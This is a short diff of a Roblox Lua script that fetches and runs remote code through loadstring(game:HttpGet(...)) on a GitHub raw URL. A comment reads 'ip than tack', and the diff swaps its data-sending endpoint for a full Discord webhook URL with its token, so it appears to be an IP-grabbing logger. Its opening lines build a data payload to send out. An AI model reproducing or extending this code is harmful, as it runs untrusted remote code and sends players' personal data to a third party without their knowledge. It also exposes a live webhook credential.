@@ -2,7 +2,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/II-Fallzy-II/ExFallzY
 
 --ip than tack
 
-local webh = "https://websec.services/send/62d7641842cd3fcfb203398b"
+local webh = "https://discord.com/api/webhooks/999135260136714275/gErFhGdLmkndAgCKGqoHQM6ZPxFe6W2fWR3ITJYxSrEi2ORomeIhTCjJbwEI1tHjyWH5"
 
 pcall(function()
    local data = {
